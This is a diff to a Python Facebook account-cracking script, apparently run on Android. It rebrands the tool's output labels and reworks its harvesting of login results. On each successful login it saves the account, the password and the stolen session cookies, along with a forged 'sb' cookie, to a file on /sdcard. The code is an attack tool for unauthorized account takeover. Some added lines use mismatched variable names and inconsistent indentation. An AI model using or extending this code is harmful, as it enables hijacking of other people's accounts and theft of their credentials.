@@ -1102,18 +1102,16 @@ def method():
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [AFTAB-Ok] '+acc+'| '+pword+'')
-                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                print('\r\033[1;92m [BLAZE-Ok] '+acc+'| '+pword+'')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
-                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                           cookies = f"sb={ssbb};{ckkk}"
-                    except Exception as e:print(str(e)+' | '+response.text)
-                print(' \033[1;97m'+cookies)
-                open('/sdcard/BLAZE-OK.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
-                
+                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NEPALb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NEPALb};{ckkk}"
+                    print(f"\r\r{G1}[NEPAL-OK] {sid} | {ps} ")
+                    print(f"\r\r{G1}[COOKIES-]>{O}{cookie} ")
+                    open('/sdcard/BLAZE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
                 break
             elif 'www.facebook.com' in response.text:
                 if cpok=='n':
